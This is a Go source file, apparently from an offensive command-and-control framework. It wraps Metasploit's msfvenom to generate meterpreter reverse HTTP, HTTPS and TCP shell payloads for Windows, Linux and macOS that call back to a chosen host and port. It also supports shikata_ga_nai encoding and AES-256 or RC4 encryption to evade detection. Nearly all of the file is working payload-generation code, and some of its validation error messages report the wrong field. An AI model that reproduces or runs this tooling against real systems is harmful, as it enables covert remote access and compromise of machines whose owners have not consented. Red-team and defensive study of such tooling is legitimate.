package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"log"
	"os/exec"
	"strconv"
	"strings"
)

const (
	consoleBin     = "msfconsole"
	venomBin       = "msfvenom"
	sep            = "/"
	encryptKeySize = 16
)

var (

	// ValidArches - Support CPU architectures
	ValidArches = map[string]bool{
		"x86": true,
		"x64": true,
	}

	// ValidEncoders - Valid MSF encoders
	ValidEncoders = map[string]bool{
		"":                   true,
		"x86/shikata_ga_nai": true,
	}

	// ValidPayloads - Valid payloads and OS combos
	ValidPayloads = map[string]map[string]bool{
		"windows": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
		"linux": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
		"osx": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
	}

	// ValidEncrypters - MSF Encrypters
	ValidEncrypters = map[string]bool{
		"":       true,
		"aes256": true,
		"rc4":    true,
	}
)

// VenomConfig -
type VenomConfig struct {
	Os         string
	Arch       string
	Payload    string
	Encoder    string
	Iterations int
	LHost      string
	LPort      uint16
	Encrypt    string
}

// MsfVersion - Return the version of MSFVenom
func MsfVersion() (string, error) {
	stdout, err := MsfConsoleCmd([]string{"--version"})
	return string(stdout), err
}

// MsfVenomPayload - Generates an MSFVenom payload
func MsfVenomPayload(config VenomConfig) ([]byte, error) {

	if _, ok := ValidPayloads[config.Os]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid operating system: %s", config.Os))
	}
	if _, ok := ValidArches[config.Arch]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid arch: %s", config.Os))
	}

	if _, ok := ValidPayloads[config.Os][config.Payload]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Os))
	}

	if _, ok := ValidEncoders[config.Encoder]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Os))
	}

	target := config.Os
	if config.Arch == "x64" {
		target = strings.Join([]string{config.Os, config.Arch}, sep)
	}
	payload := strings.Join([]string{target, config.Payload}, sep)
	args := []string{
		"--platform", config.Os,
		"--arch", config.Arch,
		"--format", "raw",
		"--payload", payload,
		fmt.Sprintf("LHOST=%s", config.LHost),
		fmt.Sprintf("LPORT=%d", config.LPort),
	}

	if config.Encoder != "" {
		iterations := config.Iterations
		if iterations <= 0 {
			iterations = 1
		}
		args = append(args,
			"--encoder", config.Encoder,
			"--iterations", strconv.Itoa(iterations))
	}

	if config.Encrypt != "" {
		iterations := config.Iterations
		if iterations <= 0 {
			iterations = 1
		}
		args = append(args,
			"--encrypt", config.Encrypt,
			"--encrypt-iv", randomEncryptKey(),
			"--encrypt-key", randomEncryptKey())
	}

	return MsfVenomCmd(args)
}

// MsfVenomCmd - Execute a msfvenom command
func MsfVenomCmd(args []string) ([]byte, error) {
	log.Printf("%s %v", venomBin, args)
	cmd := exec.Command(venomBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Printf("--- stdout ---\n%s\n", stdout.String())
		log.Printf("--- stderr ---\n%s\n", stderr.String())
		log.Print(err)
	}

	return stdout.Bytes(), err
}

// MsfConsoleCmd - Execute a msfvenom command
func MsfConsoleCmd(args []string) ([]byte, error) {
	cmd := exec.Command(consoleBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Printf("--- stdout ---\n%s\n", stdout.String())
		log.Printf("--- stderr ---\n%s\n", stderr.String())
		log.Print(err)
	}

	return stdout.Bytes(), err
}

// MsfArch - Convert golang arch to msf arch
func MsfArch(arch string) string {
	if arch == "amd64" {
		return "x64"
	}
	return "x86"
}

func randomEncryptKey() string {
	randBuf := make([]byte, 64) // 64 bytes of randomness
	rand.Read(randBuf)
	digest := sha256.Sum256(randBuf)
	return fmt.Sprintf("%x", digest[:encryptKeySize])
}
